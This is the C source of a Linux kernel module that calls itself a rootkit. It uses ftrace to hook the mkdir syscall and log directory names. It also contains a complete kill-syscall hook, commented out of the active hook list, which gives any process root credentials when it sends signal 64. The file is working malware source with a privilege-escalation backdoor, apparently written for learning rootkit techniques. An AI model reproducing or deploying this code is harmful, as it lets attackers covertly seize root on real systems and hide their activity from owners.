//
// Created by sciver on 10/16/22.
//
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ucasqsl");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}

static asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    int sig = regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);
}

#else
static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    orig_mkdir(pathname, mode);
    return 0;
}
#endif

static struct ftrace_hook hooks[] = {
        HOOK_SYS("sys_mkdir", hook_mkdir, &orig_mkdir),
//        HOOK_SYS("sys_kill", hook_kill, &orig_kill),
};

/* init and exit functions where the hooking will happen later */
static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err) {
        printk(KERN_INFO "rootkit: failed to install hooks");
        return err;
    }


    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
